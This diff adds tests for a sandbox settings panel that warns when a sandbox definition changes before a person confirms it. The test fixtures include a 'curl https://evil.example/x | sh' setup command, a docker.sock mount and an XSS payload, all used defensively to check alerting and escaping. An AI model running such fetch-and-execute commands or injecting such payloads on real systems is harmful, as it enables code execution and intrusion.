@@ -102,4 +102,105 @@ describe('Sandbox settings', () => {
     expect(items.map((li) => li.getAttribute('data-ok'))).toEqual(['true', 'false']);
     expect(items[1]!.textContent).toContain('could not get image postgres:17');
   });
+
+  describe('a definition the person has not confirmed (M7)', () => {
+    const on = { enabled: true, by: 'human:kyle', at: Date.UTC(2026, 9, 10, 12, 0) };
+    const changed: SandboxStatus = {
+      ...ready,
+      switch: on,
+      fingerprint: 'fp-1',
+      trusted: false,
+      changes: ['allowHosts added: evil.example', 'setup command added: curl https://evil.example/x | sh', 'network "allowlist" -> "open"'],
+    };
+    const callout = (r: ReturnType<typeof panel>) => r.container.querySelector<HTMLElement>('[data-testid="sandbox-untrusted"]');
+    const lines = (r: ReturnType<typeof panel>) => Array.from(r.container.querySelectorAll('[data-testid="sandbox-changes"] li')).map((li) => li.textContent);
+
+    it('says the definition changed since it was confirmed, lists what is different as text, and says tasks wait in Needs you', async () => {
+      const r = panel({ sandboxStatus: async () => changed });
+      const box = await waitFor(() => need(callout(r)), r);
+      expect(box.getAttribute('role')).toBe('alert');
+      expect(box.textContent).toContain('The sandbox definition changed since you confirmed it.');
+      expect(lines(r)).toEqual(changed.changes);
+      expect(box.textContent).toContain('Tasks of this project wait, in Needs you, until you confirm this definition.');
+      expect(byText<HTMLButtonElement>(box, 'button', 'Confirm this definition').disabled).toBe(false);
+    });
+
+    it('shows a line of the definition as the text it is, never as markup', async () => {
+      const evil = '<img src=x onerror="window.__sandboxxss=1"> setup command added: <script>window.__sandboxxss=1</script>';
+      const r = panel({ sandboxStatus: async () => ({ ...changed, changes: [evil] }) });
+      await waitFor(() => need(callout(r)), r);
+      expect(lines(r)).toEqual([evil]);
+      expect(callout(r)!.querySelector('img, script')).toBeNull();
+      expect((window as unknown as Record<string, unknown>).__sandboxxss).toBeUndefined();
+    });
+
+    it('says what a definition that was never confirmed is, from the core\'s own description', async () => {
+      const r = panel({ sandboxStatus: async () => ({ ...changed, changes: ['no definition has been confirmed yet; this one has image "node:24-bookworm", network "allowlist"'] }) });
+      await waitFor(() => need(callout(r)), r);
+      expect(lines(r)).toEqual(['no definition has been confirmed yet; this one has image "node:24-bookworm", network "allowlist"']);
+    });
+
+    it('confirms exactly the definition that was shown (its fingerprint), then reads the status again and the warning is gone', async () => {
+      const calls: [string, string][] = [];
+      let current: SandboxStatus = changed;
+      const r = panel({
+        sandboxStatus: async () => current,
+        sandboxTrust: async (p, fp) => {
+          calls.push([p, fp]);
+          current = { ...changed, trusted: true, changes: undefined };
+          return on;
+        },
+      });
+      const box = await waitFor(() => need(callout(r)), r);
+      await r.act(() => byText<HTMLButtonElement>(box, 'button', 'Confirm this definition').click());
+      await waitFor(() => expect(calls).toEqual([['p1', 'fp-1']]), r);
+      await waitFor(() => expect(callout(r)).toBeNull(), r);
+    });
+
+    it('a definition that changed again in between is refused with the core\'s words and the newer changes are shown to read again', async () => {
+      const calls: string[] = [];
+      let current: SandboxStatus = changed;
+      const r = panel({
+        sandboxStatus: async () => current,
+        sandboxTrust: async (_p, fp) => {
+          calls.push(fp);
+          if (fp !== current.fingerprint) throw new Error('the definition changed since you looked at it: read it again before you confirm');
+          current = { ...current, trusted: true, changes: undefined };
+          return on;
+        },
+      });
+      const box = await waitFor(() => need(callout(r)), r);
+      current = { ...changed, fingerprint: 'fp-2', changes: [...changed.changes!, 'volumes added: /var/run/docker.sock'] };
+      await r.act(() => byText<HTMLButtonElement>(box, 'button', 'Confirm this definition').click());
+      await waitFor(() => expect(r.container.querySelector('[role="alert"] strong')?.textContent).toBe('Not confirmed: '), r);
+      expect(r.container.textContent).toContain('the definition changed since you looked at it: read it again before you confirm');
+      await waitFor(() => expect(lines(r)).toContain('volumes added: /var/run/docker.sock'), r);
+      expect(callout(r)).not.toBeNull();
+      // the second click confirms what is shown now
+      await r.act(() => byText<HTMLButtonElement>(callout(r)!, 'button', 'Confirm this definition').click());
+      await waitFor(() => expect(calls).toEqual(['fp-1', 'fp-2']), r);
+      await waitFor(() => expect(callout(r)).toBeNull(), r);
+    });
+
+    it('shows nothing while the definition is the confirmed one', async () => {
+      const r = panel({ sandboxStatus: async () => ({ ...changed, trusted: true, changes: undefined }) });
+      await waitFor(() => need(r.container.querySelector('[data-testid="sandbox-switch-note"]')), r);
+      expect(callout(r)).toBeNull();
+    });
+
+    it('shows nothing while the sandbox is off (switching it on confirms the definition), or without a valid definition, or from a core that does not say', async () => {
+      const off = panel({ sandboxStatus: async () => ({ ...changed, switch: { enabled: false }, trusted: false }) });
+      await waitFor(() => need(off.container.querySelector('[data-testid="sandbox-definition"]')), off);
+      expect(callout(off)).toBeNull();
+      cleanup();
+      const none = panel({ sandboxStatus: async () => ({ ...changed, found: false, fingerprint: undefined, config: undefined, configError: 'the definition does not parse' }) });
+      await waitFor(() => need(none.container.querySelector('[data-testid="sandbox-definition"]')), none);
+      expect(callout(none)).toBeNull();
+      cleanup();
+      // a status that says nothing about trust (an older core, or a field that did not arrive) is not "not trusted"
+      const old = panel({ sandboxStatus: async () => ({ ...ready, switch: on, fingerprint: 'fp-1' }) });
+      await waitFor(() => need(old.container.querySelector('[data-testid="sandbox-switch-note"]')), old);
+      expect(callout(old)).toBeNull();
+    });
+  });
 });
